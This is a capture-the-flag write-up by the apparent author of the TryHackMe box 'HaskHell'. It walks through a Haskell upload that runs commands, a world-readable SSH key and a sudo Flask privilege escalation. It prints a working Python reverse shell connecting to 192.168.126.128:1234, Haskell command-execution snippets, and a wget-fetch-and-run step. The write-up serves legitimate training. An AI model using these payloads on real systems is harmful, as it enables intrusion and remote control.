---
layout: default
title: "HaskHell Author's Writeup"
permalink: /HaskHell-Authors-Writeup
categories: haskell, tryhackme, haskhell
---

This is a brief writeup of the HaskHell box for the TryHackMe platform. You can find the box here: tryhackme.com/room/haskhell

This box was made as a medium-ish difficulty box with the intent of introducing users to a new programming language. I think that functional languages are super cool but don't get enough exposure and I'm tired of cracking PHP web apps, so I wanted to do something with some truly weird functionality. 

If you like this sorta stuff and want to see more you can follow me on Twitter @passthehashbrwn

The box has a few small snags along the way, but is pretty straightforward for the most part.

## Scanning
After scanning, you'll find that port 22 and port 5001 are open. Port 5001 is running a Gunicorn web server.

## The web server
The index of the web server is the home page for a functional programming course, and provides a link to the first homework assignment.
![First page](https://passthehashbrowns.github.io/images/first_page.png)

The first homework assignment contains a few problems, and provides a link to where students can submit their Haskell files. 
![Second page](https://passthehashbrowns.github.io/images/second_page.png)

Unfortunately, the professor included the wrong link and we get a 404.
![Upload page](https://passthehashbrowns.github.io/images/upload_page.png)

With a little more enumeration, we find that there's a Submit page. Looks like the professor just got his wires crossed. The tool used here [is FFUF](https://github.com/ffuf/ffuf), my preferred tool for web fuzzing.
![Dirb scan](https://passthehashbrowns.github.io/images/dirb_scan.png)

Once we navigate to the Submit page, we find a pretty basic file upload functionality.
![Submit page](https://passthehashbrowns.github.io/images/submit_page.png)

On a previous page, the professor noted that only Haskell files would be accepted for upload, because of a lesson learned previously. We can try uploading other types of files, but they won't be accepted. We have a few routes that we can take from here. The immediate thought that comes to mind is to try and use Haskell to interact with system processes. I've written a short piece of code to do just that. This screenshot shows "ls -la" but in the actual submission I used wget to download a Python payload, and then run it in another upload.
![Haskell base code](https://passthehashbrowns.github.io/images/haskell_base_cmd.png)

The Python payload that I used is just the PentestMonkey Python one-liner expanded because of my own neurosis.

~~~python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.126.128",1234))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
~~~

NOTE: I've had some users saying that the box is broken because they get an internal server error if there's an integer or special character in the file name. The box isn't broken, this was done on purpose because I didn't want to introduce an OS Command Injection into the machine and I decided to blacklist all non alpha characters except for the dot in the file extension since that's exactly how a lazy professor would do it. Totally not cause I'm lazy. You can see the code that causes this here:
![Server error code](https://passthehashbrowns.github.io/images/server_error_code.png)

Some TryHackMe users were more clever than me implemented this more concisely. The reason that my solution uses wget to grab a Python file is that when you try to use createProcess with your standard BASH reverse shell, you get some weird issues with redirection. The most common solution that I've seen is to use the callCommand function from the System.Process library, which takes the command string as an argument. Here are the two for comparison:
1.
~~~haskell
import System.Process
import System.IO
main = do 
    (_, Just hout, _, _) <- createProcess (proc "ls" ["-la"]){ std_out = CreatePipe }
    cmdOut <- hGetContents hout
    putStrLn cmdOut
~~~
2.
~~~haskell
import System.Process
main = do
  callCommand "ls -la"
~~~

I use "ls -la" as an atomic example. While my solution does correctly handle IO, I think that their solution is far better in this case.

Still, I felt sort of weird that there was no existing reverse shell implementation in Haskell, so I went ahead and wrote my own. [You can find it here.](https://github.com/passthehashbrowns/Haskell-Reverse-Shell) Ironically, it doesn't work on this web server because of how the command is being run, but it does serve as a POC.

Anyways, using the Python payload, we can wget it and then run it.
![Python wget](https://passthehashbrowns.github.io/images/python_wget.png)

Now we get our callback as the flask user.
![Reverse shell catch](https://passthehashbrowns.github.io/images/rev_shell_callback.png)

## Escalating to prof
My preferred Linux enumeration tool is LinPEAS, but whatever tool you use should catch that the prof user's SSH key is world readable.
![LinPEAS SSH key](https://passthehashbrowns.github.io/images/linpeas_ssh_key.png)

Now we can SSH into the server by doing a quick chmod to give our key either 400 or 600 permissions. Once in the server as prof, we'll find that we can run Flask with sudo rights. The other thing that should stand out is that FLASK_APP is in the env_keep entry. This was necessary when building the box as the user needs to be able to set the FLASK_APP variable for later.
![Sudo enumeration](https://passthehashbrowns.github.io/images/sudo_enum.png)

Using Flask we can use the exact same Python payload as before and catch our root shell.
![Flask run](https://passthehashbrowns.github.io/images/flask_run.png)
![Catch root shell](https://passthehashbrowns.github.io/images/catch_root_shell.png)

Hopefully you enjoyed this box, I had a great time making it and plan on making more in the future. 


